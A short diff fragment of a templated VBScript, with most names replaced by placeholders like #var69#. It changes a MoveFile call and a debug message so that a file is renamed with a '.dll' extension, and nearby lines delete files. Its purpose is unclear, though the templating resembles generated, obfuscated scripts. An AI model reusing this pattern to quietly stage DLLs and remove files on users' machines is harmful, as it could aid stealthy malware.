@@ -579,9 +579,9 @@ msgbox  "2-De " & #var71# &" para "& #var69# & #var73# & "4" & #var6# &  #var7#
 'De#var17#F #var69# + #var73# + "4" + #var6#,  #var69# + #var73# + "4" + #var7#
 #var31# #var69# & #var73# & "4" &  #var6# & #var7#, #var69#
 
-msgbox  "2-De MF " & #var69# & #var8# & " para "& #var69# & #var73# 
+msgbox  "2-De MF " & #var69# & #var8# &".dll"& " para "& #var69# & #var73# 
 Set #var34# = CreateObject(#const51#)
-#var34#.MoveFile #var69# & #var8# , #var69# & #var73#
+#var34#.MoveFile #var69# & #var8# &".dll", #var69# & #var73#
 #var34#.DeleteFile( #var69# & #var73# + "4" + #var6# & #var7#)
 '#var34#.DeleteFile( #var69# & #var73# + "4" & #var6#)
 
